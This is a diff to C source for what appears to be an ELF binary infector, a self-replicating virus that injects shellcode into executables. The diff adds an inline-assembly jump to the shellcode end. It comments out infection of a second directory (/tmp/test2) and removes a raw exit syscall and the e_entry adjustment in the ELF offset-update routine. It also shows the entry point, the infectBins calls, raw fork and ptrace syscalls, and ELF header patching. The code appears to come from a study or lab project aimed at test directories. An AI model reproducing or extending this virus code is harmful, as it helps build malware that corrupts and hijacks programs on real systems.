@@ -4,6 +4,7 @@ static void  start(void) {}
 
 #include "shellcode.h"
 
+asm("jmp endSC");
 int   entry_point(void *magic) {
   char    infectDir[] = "/tmp/test";
   char    infectDir2[] = "/tmp/test2";
@@ -18,8 +19,8 @@ int   entry_point(void *magic) {
       return (stop(1, magic));
   if (infectBins(infectDir) == -1)
     return (stop(1, magic));
-  if (infectBins(infectDir2) == -1)
-    return (stop(1, magic));
+  /* if (infectBins(infectDir2) == -1) */
+  /*   return (stop(1, magic)); */
   return (stop(0, magic));
 }
 
@@ -178,14 +179,6 @@ static pid_t  fork(void) {
   asm("syscall"
     : "=r" (ret));
   return (ret);
-}
-
-static void exit(int status) {
-  register int  rax asm("rax") = 60;
-  register int  rdi asm("rdi") = status;
-
-  asm("syscall"
-    : "=r" (rax));
 }
 
 static long ptrace(enum __ptrace_request request, pid_t pid, void *addr, void *data) {
@@ -478,8 +471,6 @@ static void updateOffsets(Elf64_Ehdr *header, size_t offset, size_t toAdd) {
     Elf64_Shdr  *section;
     Elf64_Phdr  *program;
 
-    if (header->e_entry > offset)
-      header->e_entry += toAdd;
     if (header->e_phoff > offset)
       header->e_phoff += toAdd;
     if (header->e_shoff > offset)
